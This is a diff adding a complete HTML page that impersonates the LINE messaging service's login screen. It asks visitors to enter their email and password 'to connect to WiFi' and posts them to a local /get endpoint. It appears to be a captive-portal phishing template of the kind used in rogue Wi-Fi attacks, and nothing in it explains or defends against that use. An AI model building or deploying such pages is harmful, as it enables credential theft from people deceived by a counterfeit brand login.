@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+    <title>LINE</title>
+    <style>
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
+        background-color: #06c755;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+      }
+      .login-container {
+        width: 380px;
+        background: #fff;
+        border-radius: 16px;
+        padding: 40px 32px;
+        text-align: center;
+      }
+      #logo {
+        margin-bottom: 20px;
+      }
+      .g-h1 {
+        font-size: 24px;
+        font-weight: 700;
+        color: #06c755;
+        margin-bottom: 8px;
+      }
+      .g-h2 {
+        font-size: 14px;
+        color: #666;
+        margin-bottom: 24px;
+      }
+      .g-input {
+        width: 100%;
+        padding: 14px 16px;
+        border: 2px solid #e0e0e0;
+        border-radius: 24px;
+        font-size: 16px;
+        margin-bottom: 16px;
+        box-sizing: border-box;
+        outline: none;
+      }
+      .g-input:focus {
+        border-color: #06c755;
+      }
+      .gbtn-primary {
+        width: 100%;
+        padding: 14px;
+        background-color: #06c755;
+        color: #fff;
+        border: none;
+        border-radius: 24px;
+        font-size: 16px;
+        font-weight: 700;
+        cursor: pointer;
+      }
+      .gbtn-primary:hover {
+        background: #05b34c;
+      }
+      .footer {
+        margin-top: 20px;
+        font-size: 13px;
+        color: #666;
+      }
+      .footer a {
+        color: #06c755;
+        text-decoration: none;
+        font-weight: 600;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-container">
+      <svg id="logo" viewBox="0 0 120 36" width="120" height="36">
+        <text x="50%" y="30" text-anchor="middle" font-family="Arial" font-weight="800" font-size="32" fill="#06c755">LINE</text>
+      </svg>
+      <h1 class="g-h1">Welcome to LINE</h1>
+      <p class="g-h2">Log in to connect to WiFi</p>
+      <form action="/get" method="POST">
+        <input class="g-input" type="email" name="email" placeholder="Email Address" required>
+        <input class="g-input" type="password" name="password" placeholder="Password" required>
+        <button type="submit" class="gbtn-primary">Log In</button>
+      </form>
+      <p class="footer">New to LINE? <a href="#">Sign Up</a></p>
+    </div>
+  </body>
+</html>
